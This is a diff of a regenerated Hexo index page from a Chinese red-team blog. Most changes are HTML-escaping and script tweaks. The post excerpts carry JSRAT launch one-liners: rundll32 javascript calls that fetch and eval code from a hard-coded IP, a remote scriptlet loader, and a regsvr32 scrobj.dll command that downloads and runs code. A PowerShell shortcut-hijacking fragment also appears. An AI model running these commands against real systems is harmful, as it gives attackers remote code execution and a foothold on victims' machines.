@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -90,13 +107,13 @@
   <meta name="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
 <meta name="keywords" content="Red Team;Hack;半吊子程序猿,web;">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Evi1cg's blog">
+<meta property="og:title" content="Evi1cg&#39;s blog">
 <meta property="og:url" content="https://evi1cg.github.io/page/12/index.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
 <meta property="og:locale" content="zh-CN">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Evi1cg's blog">
+<meta name="twitter:title" content="Evi1cg&#39;s blog">
 <meta name="twitter:description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
 
 
@@ -487,14 +504,14 @@
 Code:
 calc:
 $WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("des
+$Shortcut = $WshShell.CreateShortcut(&quo
               ...
             </p>
           <!--noindex-->
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/hijacking-common-windows-shortcuts-with-powershell.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -660,16 +677,16 @@ $Shortcut = $WshShell.CreateShortcut("des
       
         
           <!-- index-menu -->
-<h2 id="0x00-优化JSRAT"><a href="#0x00-优化JSRAT" class="headerlink" title="0x00 优化JSRAT"></a>0x00 优化JSRAT</h2><p>进一步优化的jsrat启动代码：<br></p><figure class="highlight accesslog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=new%20ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);w=new%20ActiveXObject(<span class="string">"WScript.Shell"</span>);try{v=w.RegRead(<span class="string">"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer"</span>);try{q=v.split(<span class="string">"="</span>)<span class="string">[1]</span>.split(<span class="string">";"</span>)<span class="string">[0]</span>;h.SetProxy(<span class="number">2</span>,q);}catch(e){h.SetProxy(<span class="number">2</span>,v);}}finally{h.Open(<span class="string">"<span class="keyword">GET</span>"</span>,<span class="string">"http://54.93.72.226:8080/connect"</span>,false);h.Send();B=h.ResponseText;eval(B)}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="0x00-优化JSRAT"><a href="#0x00-优化JSRAT" class="headerlink" title="0x00 优化JSRAT"></a>0x00 优化JSRAT</h2><p>进一步优化的jsrat启动代码：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=new%20ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);w=new%20ActiveXObject(<span class="string">"WScript.Shell"</span>);try&#123;v=w.RegRead(<span class="string">"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer"</span>);try&#123;q=v.split(<span class="string">"="</span>)<span class="string">[1]</span>.split(<span class="string">";"</span>)<span class="string">[0]</span>;h.SetProxy(<span class="number">2</span>,q);&#125;catch(e)&#123;h.SetProxy(<span class="number">2</span>,v);&#125;&#125;finally&#123;h.Open(<span class="string">"<span class="keyword">GET</span>"</span>,<span class="string">"http://54.93.72.226:8080/connect"</span>,false);h.Send();B=h.ResponseText;eval(B)&#125;</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>当客户端存在代理的时候，通过代理来进行链接。</p>
 </blockquote>
-<p>多了注册表关键字，容易被杀，可以使用<a href="https://evi1cg.github.io/archives/Run_JSRAT.html">WSC</a>方式来启动，将代码写到远程文件，执行如下命令：<br></p><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.<span class="built_in">write</span>();GetObject(<span class="string">"script:https://url/script"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>多了注册表关键字，容易被杀，可以使用<a href="https://evi1cg.github.io/archives/Run_JSRAT.html">WSC</a>方式来启动，将代码写到远程文件，执行如下命令：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.<span class="built_in">write</span>();GetObject(<span class="string">"script:https://url/script"</span>)</span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/Javascript_And_ComScript.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -843,7 +860,7 @@ $Shortcut = $WshShell.CreateShortcut("des
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/Use_Web_delivery_Under_DMZ.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -1008,13 +1025,13 @@ $Shortcut = $WshShell.CreateShortcut("des
 
       
         
-          <h2 id="1-默认方式"><a href="#1-默认方式" class="headerlink" title="1.默认方式"></a>1.默认方式</h2><figure class="highlight accesslog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=new%20ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"<span class="keyword">GET</span>"</span>,<span class="string">"http://127.0.0.1:8081/connect"</span>,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd /c taskkill /f /im rundll32.exe"</span>,<span class="number">0</span>,true);}%</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="2-Use-SCT"><a href="#2-Use-SCT" class="headerlink" title="2.Use SCT"></a>2.Use SCT</h2><p><strong>运行计算器</strong>：<br></p><figure class="highlight jboss-cli"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 <span class="string">/u</span> <span class="string">/s</span> <span class="string">/i</span><span class="function">:http</span>:<span class="string">//urlto/calc.sct</span> scrobj.dll</span><br></pre></td></tr></tbody></table></figure><p></p>
+          <h2 id="1-默认方式"><a href="#1-默认方式" class="headerlink" title="1.默认方式"></a>1.默认方式</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=new%20ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"<span class="keyword">GET</span>"</span>,<span class="string">"http://127.0.0.1:8081/connect"</span>,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd /c taskkill /f /im rundll32.exe"</span>,<span class="number">0</span>,true);&#125;%</span><br></pre></td></tr></table></figure>
+<h2 id="2-Use-SCT"><a href="#2-Use-SCT" class="headerlink" title="2.Use SCT"></a>2.Use SCT</h2><p><strong>运行计算器</strong>：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 <span class="string">/u</span> <span class="string">/s</span> <span class="string">/i</span><span class="function">:http</span>:<span class="string">//urlto/calc.sct</span> scrobj.dll</span><br></pre></td></tr></table></figure></p>
           <!--noindex-->
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/Run_JSRAT.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -1189,7 +1206,7 @@ $Shortcut = $WshShell.CreateShortcut("des
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/MS16-032-Windows-Privilege-Escalation.html#more" rel="contents">
-                阅读全文 »
+                阅读全文 &raquo;
               </a>
             </div>
           
@@ -1244,7 +1261,7 @@ $Shortcut = $WshShell.CreateShortcut("des
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">…</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">…</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1472,7 +1489,7 @@ $Shortcut = $WshShell.CreateShortcut("des
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1483,7 +1500,7 @@ $Shortcut = $WshShell.CreateShortcut("des
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1494,7 +1511,7 @@ $Shortcut = $WshShell.CreateShortcut("des
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1505,7 +1522,7 @@ $Shortcut = $WshShell.CreateShortcut("des
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -1540,7 +1557,7 @@ $Shortcut = $WshShell.CreateShortcut("des
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1602,8 +1619,6 @@ $Shortcut = $WshShell.CreateShortcut("des
 
 
 
-  
-
 
 
 
@@ -1632,9 +1647,6 @@ $Shortcut = $WshShell.CreateShortcut("des
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -2060,11 +2072,6 @@ $Shortcut = $WshShell.CreateShortcut("des
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -2204,6 +2211,5 @@ $Shortcut = $WshShell.CreateShortcut("des
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
